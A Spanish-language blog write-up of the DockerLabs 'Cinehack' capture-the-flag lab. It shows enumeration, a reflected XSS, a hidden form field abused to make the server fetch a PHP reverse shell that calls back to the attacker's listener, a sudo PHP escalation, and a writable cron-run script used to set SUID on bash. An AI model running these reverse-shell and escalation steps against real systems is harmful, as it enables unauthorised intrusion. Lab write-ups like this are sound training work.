---
title: DockerLabs - Cinehack
summary: "Write-up del laboratorio Cinehack de DockerLabs"
author: elcybercurioso
date: 2026-02-03 12:53:19
categories: [Post, DockerLabs]
tags: []
media_subpath: "/assets/img/posts/dockerlabs_cinehack"
image:
  path: main.webp
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Cinehack]
└─$ nmap -p- -sS --min-rate 5000 -n -Pn 172.17.0.2
PORT   STATE SERVICE
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Cinehack]
└─$ nmap -sCV -p80 172.17.0.2             
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Bienvenido a Cinema DL
|_http-server-header: Apache/2.4.58 (Ubuntu)
```

## análisis

Analizamos la página web que hay disponible en el puerto 80 de la máquina, donde hacen referencia a `Cinama DL`:

![Desktop View](/20260120234951.webp){: width="972" height="589" .shadow}

Dejaremos en segundo plano **gobuster** buscando por fuerza bruta recursos del sistema, el cual finalmente no nos encuentra nada relevante:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Cinehack]
└─$ gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.html,.txt 2>/dev/null
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1796]
/server-status        (Status: 403) [Size: 275]

===============================================================
Finished
===============================================================
```

Con respecto a la información que nos da la página, tal y como hemos visto en otras máquinas, a veces hay dominios configurados, y el **TLD** (Top-Level Domain) que tienen configurado suele ser `.dl` (el cual coincide con lo que nos indican), por lo que probablemente en este caso el dominio que hay configurado sea `cinema.dl`.

Por todo esto, agregaremos al fichero `/etc/passwd` de nuestra máquina este dominio para que se resuelva correctamente:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Cinehack]
└─$ cat /etc/hosts | grep cinema                                        
172.17.0.2      cinema.dl
```

Cuando estemos tratando con dominios, siempre es recomendable buscar subdominios configurados a partir de los que conocemos.

En este caso, emplearemos el modo `vhost` de **gobuster** para esta tarea, pero no nos encuentra ningún subdominio:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Cinehack]
└─$ gobuster vhost -u 'http://cinema.dl' -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r --ad                   
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://cinema.dl
[+] Method:                    GET
[+] Threads:                   200
[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:                gobuster/3.8
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Progress: 114442 / 114442 (100.00%)
===============================================================
Finished
===============================================================
```

Buscaremos también recursos configurados en el dominio `cinema.dl`, ya que puede estar configurado de diferente manera y puede contener otros recursos diferentes con respecto a cuando accedemos por la IP:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Cinehack]
└─$ gobuster dir -u "http://cinema.dl" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.html,.txt            
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cinema.dl
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 7502]
/reservation.php      (Status: 200) [Size: 1779]
/server-status        (Status: 403) [Size: 274]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

Encontramos el fichero `reservation.php`, el cual carga un panel de confirmación de reserva de entradas:

![Desktop View](/20260121210608.webp){: width="972" height="589" .shadow}

Debido a que no vemos nada a simple vista, seguimos haciendo reconocimiento de la máquina.

Si accedemos al dominio `cinema.dl`, veremos que ahora nos carga una página distinta:

![Desktop View](/20260121193303.webp){: width="972" height="589" .shadow}

De todas las películas que hay publicadas, la única que no tiene el aviso de **SOLD OUT** es la última (`El tiempo que tenemos`), la cual nos permite acceder para comprar entradas:

![Desktop View](/20260121214936.webp){: width="972" height="589" .shadow}

Elegimos los asientos, indicamos los datos y confirmamos la reserva:

![Desktop View](/20260121215241.webp){: width="972" height="589" .shadow}

Vemos que nos redirige a la página que habíamos visto antes, pero con los datos que habíamos indicado en la reserva:

![Desktop View](/20260121215307.webp){: width="972" height="589" .shadow}

Interceptamos la petición que se realiza al cargar la página, donde vemos que es una petición POST a `/reservation.php`, y ya que vemos que se refleja lo que enviamos por parámetros en la página, probamos a ver si es vulnerable a un ataque **XSS**:

![Desktop View](/20260121220433.webp){: width="972" height="589" .shadow}

Si dejamos correr la petición después de hacer la modificación, veremos en el navegador que nos salta una ventana emergente, confirmando la vulnerabilidad XSS:

![Desktop View](/20260121220308.webp){: width="600" height="420" .shadow}

## acceso inicial (www-data)

También observamos en los datos que se envían en la petición POST al cargar la página que hay un campo `problem_url`, el cual tiene un valor sospechoso:

![Desktop View](/20260121221251.webp){: width="972" height="589" .shadow}

Si volvemos a la página donde creamos las reservas, veremos en el código fuente que hay un campo oculto, ya que es de tipo `hidden`:

![Desktop View](/20260121221109.webp){: width="972" height="589" .shadow}

Le cambiamos el tipo por otro cualquiera, y veremos que ahora es visible y editable:

![Desktop View](/20260121221152.webp){: width="972" height="589" .shadow}

Como podemos cambiar el valor de este campo, lo que podemos intentar es crear un script en nuestra máquina, abrir un servidor web poniendo dicho script a disposición, e indicar la URL al script en nuestra máquina, por si durante la creación o la consulta de la reserva podemos subir dicho script a la máquina víctima.

Lo primero será obtener el script en PHP que nos devuelva una consola cuando se ejecute, y en este caso optaremos por el siguiente script de [PentestMonkey](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php) (donde modificaremos las variables `$ip` y `$port` por lo que corresponda en nuestro caso):

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Cinehack]
└─$ head -n 10 revshell.php
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '172.17.0.1';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
```

Ahora abriremos un servidor HTTP con Python:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Cinehack]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Creamos la reserva, indicando la IP de nuestra máquina, y el script que hemos generado:

![Desktop View](/20260122000445.webp){: width="550" height="290" .shadow}

Dado que todavía no conocemos donde se está subiendo el script (ya que con **gobuster** no encontramos ninguna carpeta donde pueda estar), podemos generar un listado de posibles rutas a partir del texto que hay en la página web empleando herramientas como **cewl**:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Cinehack]
└─$ cewl -o -k "http://cinema.dl"
CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
tiempo
que
tenemos
Género
Duración
Película
....
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Cinehack]
└─$ cewl -o -k "http://cinema.dl" > wordlist
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Cinehack]
└─$ cat wordlist | wc -l
149
```

Vemos que en el cartel de la película `El tiempo que tenemos` (la única a la que podemos acceder) hay palabras que no están en el listado que devuelve **cewl**, así que los añadimos manualmente:

```bash
brooklyn
andrew
garfield
andrewgarfield
florence
pugh
florencepugh
joya
disfrutar
mejores
peliculas
romanticas
octubre
cines
```

Volvemos a emplear **gobuster** para comprobar si encontramos recursos con la lista que hemos generado, el cual finalmente nos encuentra el recurso `/andrewgarfield`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Cinehack]
└─$ gobuster dir -u "http://cinema.dl" -w wordlist -t 200 -x .php,.html,.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cinema.dl
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                wordlist
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/andrewgarfield       (Status: 301) [Size: 315] [--> http://cinema.dl/andrewgarfield/]
/reserva.html         (Status: 200) [Size: 11255]
Progress: 648 / 648 (100.00%)
===============================================================
Finished
===============================================================
```

Al acceder, vemos que se trata de un directorio, el cual contiene un script en PHP. Si tratamos de abrirlo, veremos que se queda cargando sin llegar a finalizar:

![Desktop View](/20260121225033.webp){: width="600" height="420" .shadow}

Por el tamaño que tiene, podemos confirmar que no es nuestro script.

Sabemos que al realizar la reserva, la petición que se lanza en el recurso `/reservation.php` es de tipo POST, por lo que probaremos a lanzar la misma petición, pero con el método GET:

![Desktop View](/20260121234606.webp){: width="972" height="589" .shadow}

Veremos que en este caso se ha realizado una petición al script `/revshell.php` en el servidor de Python que hemos desplegado:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Cinehack]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.17.0.2 - - [21/Jan/2026 22:44:45] "GET /revshell.php HTTP/1.1" 200 -
```

Si volvemos a recargar la carpeta `/andrewgarfield`, veremos que está subido nuestro script:

![Desktop View](/20260121235137.webp){: width="600" height="420" .shadow}

Nos pondremos en escucha con **nc**, ejecutaremos nuestro script y habremos obtenido la consola remota:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Cinehack]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 38212
Linux dc4ed560f790 6.12.38+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.38-1kali1 (2025-08-12) x86_64 x86_64 x86_64 GNU/Linux
 23:56:43 up 4 days,  2:59,  0 user,  load average: 1.15, 1.06, 1.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU  WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can`t access tty; job control turned off
$ whoami
www-data
$ hostname -I
172.17.0.2
```

Procedemos a tratar la TTY para obtener una consola completamente funcional:

```bash
$ script -c bash /dev/null
Script started, output log file is '/dev/null'.
www-data@dc4ed560f790:/$ ^Z
zsh: suspended  nc -nlvp 4444

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Cinehack]
└─$ stty raw -echo;fg   
[1]  + continued  nc -nlvp 4444
                               reset xterm

www-data@dc4ed560f790:/$ export TERM=xterm
www-data@dc4ed560f790:/$ export SHELL=bash
www-data@dc4ed560f790:/$ stty rows 45 columns 210
```

## movimiento lateral (boss)

En los permisos SUDO del usuario `www-data` encontramos que podemos ejecutar PHP como el usuario `boss`:

```bash
www-data@dc4ed560f790:/$ sudo -l
Matching Defaults entries for www-data on dc4ed560f790:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on dc4ed560f790:
    (boss) NOPASSWD: /bin/php
```

Revisamos en [GTFOBins](https://gtfobins.org/gtfobins/php/#shell) como podemos aprovecharnos de estos permisos, que sería de la siguiente manera (emplearemos la opción `a`):

![Desktop View](/20260122001645.webp){: width="972" height="589" .shadow}

Adaptamos el comando para que aplique a nuestro caso, y de esta manera obtenemos una consola como el usuario `boss`:

```bash
www-data@dc4ed560f790:/$ sudo -u boss /bin/php -r 'system("/bin/bash -i");'
boss@dc4ed560f790:/$ whoami
boss
```

En el directorio del usuario `boss` encontramos la primera flag:

```bash
boss@dc4ed560f790:~$ cat user.txt 
93a8****************************
```

## escalada de privilegios (root)

Al rato de conectarnos como el usuario `boss`, nos damos cuenta de que se nos cierra la sesión. Esto puede deberse a que hay alguna tarea ejecutándose a intervalos regulares de tiempo que nos cierre la sesión.

Investigamos como el usuario `www-data` posibles ficheros cron que puedan estar ejecutándose:

```bash
www-data@dc4ed560f790:/$ find / -iname cron 2>/dev/null
/etc/default/cron
/etc/init.d/cron
/etc/pam.d/cron
/usr/share/doc/cron
/usr/share/bug/cron
/usr/sbin/cron
/var/spool/cron
```

Encontramos que el directorio `/var/spool/cron` pertenece al usuario `boss`, lo que parece prometedor, pero debido a los permisos, no podemos ver su contenido:

```bash
www-data@dc4ed560f790:/$ ls -la /var/spool/cron
total 20
drwxr-xr-x 1 root root    4096 Jan 15  2025 .
drwxr-xr-x 1 root root    4096 Jan 15  2025 ..
dr-xrwx--T 1 boss crontab 4096 Jan 22 00:32 crontabs
www-data@dc4ed560f790:/$ ls -la /var/spool/cron/crontabs/
ls: cannot open directory '/var/spool/cron/crontabs/': Permission denied
```

Volvemos a conseguir una consola como el usuario `boss`, y vemos que dentro hay un script que a su vez ejecuta otros dos scripts:

```bash
boss@dc4ed560f790:/$ ls -la /var/spool/cron/crontabs/
total 16
dr-xrwx--T 1 boss crontab 4096 Jan 22 00:32 .
drwxr-xr-x 1 root root    4096 Jan 15  2025 ..
-rwxr-xr-x 1 root crontab 1186 Jan 16  2025 root.sh
boss@dc4ed560f790:/$ cat /var/spool/cron/crontabs/root.sh 
#!/bin/bash

# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (/tmp/crontab.JicO9c/crontab installed on Thu Jan 16 11:58:58 2025)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command

#*/1 * * * * chmod +r /var/spool/cron/crontabs/root
/opt/update.sh
/tmp/script.sh
```

Cuando revisamos el script `/opt/update.sh` nos daremos cuenta de que este es el que nos está cerrando la sesión:

```bash
boss@dc4ed560f790:/$ cat /opt/update.sh
#!/bin/bash

# Comprobar si el usuario 'boss' tiene algún proceso en ejecución
# También buscar procesos asociados a "script" o shells indirectas
if pgrep -u boss > /dev/null; then
    # Mostrar procesos activos del usuario boss para depuración (opcional)
    echo "Procesos activos del usuario boss:"
    ps -u boss

    # Matar todos los procesos del usuario 'boss' incluyendo 'script'
    pkill -u boss
    pkill -9 -f "script"

    # Confirmar que los procesos fueron terminados
    if pgrep -u boss > /dev/null; then
        echo "No se pudieron terminar todos los procesos del usuario boss."
    else
        echo "El usuario boss ha sido desconectado por seguridad."
    fi
else
    echo "El usuario boss no está conectado."
fi
```

Revisamos el contenido del script `/tmp/script.sh`, pero vemos que no existe:

```bash
boss@dc4ed560f790:/$ cat /tmp/script.sh
cat: /tmp/script.sh: No such file or directory
```

Como tenemos permisos para escribir en la carpeta `/tmp`, crearemos un script que modifique los permisos del binario `/bin/bash` para que sea **SUID** (permite ejecutar un fichero con los permisos del propietario, que en este caso es `root`).

Revisaremos primeramente los permisos del binario `/bin/bash`, el cual vemos que tiene los permisos por defecto:

```bash
www-data@dc4ed560f790:/tmp$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Ahora crearemos el script con el comando que le asigne el permisos SUID:

```bash
www-data@dc4ed560f790:/tmp$ cat script.sh 
chmod u+s /bin/bash
```

Modificaremos también los permisos del script para pueda ser ejecutado:

```bash
www-data@dc4ed560f790:/tmp$ chmod 777 script.sh 
www-data@dc4ed560f790:/tmp$ ls -la script.sh 
-rwxrwxrwx 1 www-data www-data XX XXX XX XX:XX script.sh
```

Tras esperar un rato, si volvemos a revisar los permisos del binario `/bin/bash`, veremos que ahora tiene permisos **SUID**:

```bash
www-data@dc4ed560f790:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Por lo tanto, procedemos a invocar una consola privilegiada como el usuario `root`:

```bash
www-data@dc4ed560f790:/tmp$ bash -p
bash-5.2# whoami
root
```

La segunda flag es la siguiente:

```bash
bash-5.2# cat /root/root.txt 
687f****************************
```

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>